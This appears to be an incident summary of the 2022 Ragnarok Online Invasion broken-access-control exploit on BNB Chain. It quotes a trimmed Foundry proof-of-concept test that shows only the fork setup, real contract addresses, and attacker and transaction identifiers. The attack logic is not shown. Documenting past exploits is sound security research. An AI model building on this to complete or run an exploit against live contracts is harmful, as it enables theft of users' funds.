# [?] Ragnarok Online Invasion - Broken Access Control

## Summary
Severity: Unknown
Chain: BNB Chain
Component: ROI
Published: 2022-09-08
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/ROI_exp.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 157.98 BNB (~44,000 US$)
// Attacker : 0x91b7f203ed71c5eccf83b40563e409d2f3531114
// Attack Contract : 0x158af3d23d96e3104bcc65b76d1a6f53d0f74ed0
// Vulnerable Contract : https://bscscan.com/address/0xe48b75dc1b131fd3a8364b0580f76efd04cf6e9c#code (ROIToken)
// Attack Tx : 0x0e14cb7eabeeb2a819c52f313c986a877c1fa19824e899d1b91875c11ba053b0

// @NewsTrack
// Blocksec : https://twitter.com/BlockSecTeam/status/1567746825616236544
// CertiKAlert : https://twitter.com/CertiKAlert/status/1567754904663429123
// PANews : https://www.panewslab.com/zh_hk/articledetails/mbzalpdi.html
// QuillAudits Team : https://medium.com/quillhash/decoding-ragnarok-online-invasion-44k-exploit-quillaudits-261b7e23b55

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IROIToken constant ROI = IROIToken(0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c);

contract Attacker is Test {
    IERC20 constant busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair constant busdroiPair = IPancakePair(0x745D6Dd206906dd32b3f35E00533AD0963805124); // BUSD/ROI Pair

    function setUp() public {
        cheat.createSelectFork("bsc", 21_143_795);
        cheat.deal(address(this), 5 ether);
        cheat.label(address(ROI), "ROI");
        cheat.label(address(busd), "BUSD");
        cheat.label(address(wbnb), "WBNB");
        cheat.label(address(pancakeRouter), "PancakeRouter");
        cheat.label(address(busdroiPair), "BUSD/ROI Pair");
    }

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/ROI_exp.sol_
